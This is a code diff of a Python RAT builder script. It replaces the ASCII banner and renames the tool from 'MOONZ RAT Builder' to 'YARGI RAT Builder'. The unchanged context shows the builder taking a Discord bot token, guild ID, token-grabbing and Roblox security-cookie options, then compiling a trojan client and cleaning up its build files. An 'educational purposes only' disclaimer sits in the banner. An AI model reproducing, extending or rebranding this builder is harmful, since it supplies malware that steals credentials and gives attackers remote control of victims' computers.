@@ -53,14 +53,21 @@ def clear():
     
 ascii_art = """
 
-███╗░░░███╗░█████╗░░█████╗░███╗░░██╗███████╗
-████╗░████║██╔══██╗██╔══██╗████╗░██║╚════██║
-██╔████╔██║██║░░██║██║░░██║██╔██╗██║░░███╔═╝
-██║╚██╔╝██║██║░░██║██║░░██║██║╚████║██╔══╝░░
-██║░╚═╝░██║╚█████╔╝╚█████╔╝██║░╚███║███████╗
-╚═╝░░░░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚══╝╚══════╝
+
+                                                                            
+`8.`8888.      ,8'    .8.          8 888888888o.      ,o888888o.     8 8888 
+ `8.`8888.    ,8'    .888.         8 8888    `88.    8888     `88.   8 8888 
+  `8.`8888.  ,8'    :88888.        8 8888     `88 ,8 8888       `8.  8 8888 
+   `8.`8888.,8'    . `88888.       8 8888     ,88 88 8888            8 8888 
+    `8.`88888'    .8. `88888.      8 8888.   ,88' 88 8888            8 8888 
+     `8. 8888    .8`8. `88888.     8 888888888P'  88 8888            8 8888 
+      `8 8888   .8' `8. `88888.    8 8888`8b      88 8888   8888888  8 8888 
+       8 8888  .8'   `8. `88888.   8 8888 `8b.    `8 8888       .8'  8 8888 
+       8 8888 .888888888. `88888.  8 8888   `8b.     8888     ,88'   8 8888 
+       8 8888.8'       `8. `88888. 8 8888     `88.    `8888888P'     8 8888 
        
-                            ©TT:yargi.py
+       
+                                 ©TT:yargi.py
 
 This tool has been made for educational purposes only. I am not responsible for any misuse of this tool.
 Made by YARGI
@@ -70,7 +77,7 @@ os.system("""title "YARGI RAT Builder | Warning | Unlicensed"
 """)
 pause()
 clear()
-os.system("""title "MOONZ RAT Builder | Configuration | Unlicensed"
+os.system("""title "YARGI RAT Builder | Configuration | Unlicensed"
 """)
 print(colored(ascii_art, 'white'))
 print(colored("-"*75,'red'))
@@ -97,10 +104,10 @@ if prompt.lower() == "y":
     pass
 elif prompt.lower() == "n":
     exit()
-os.system("""title "MOONZ RAT Builder | Compiling | Unlicensed"
+os.system("""title "YARGI RAT Builder | Compiling | Unlicensed"
 """)
 clear()
-print(colored("Started compiling MOONZ RAT configuration...", 'green'))
+print(colored("Started compiling YARGI RAT configuration...", 'green'))
 shutil.copy(samplefile, "build\main.py")
 builder = Builder(token=token,guild_id=guildid,announc=annc,passw=passw,tokens=tokens,roblosec=roblosecurity)
 builder.build()
@@ -113,6 +120,6 @@ os.remove("build\main.py")
 shutil.rmtree("dist")
 shutil.rmtree("build")
 os.remove("Client-built.spec")
-os.system("""title "MOONZ RAT Builder | Built | Unlicensed"
+os.system("""title "YARGI RAT Builder | Built | Unlicensed"
 """)
 pause()
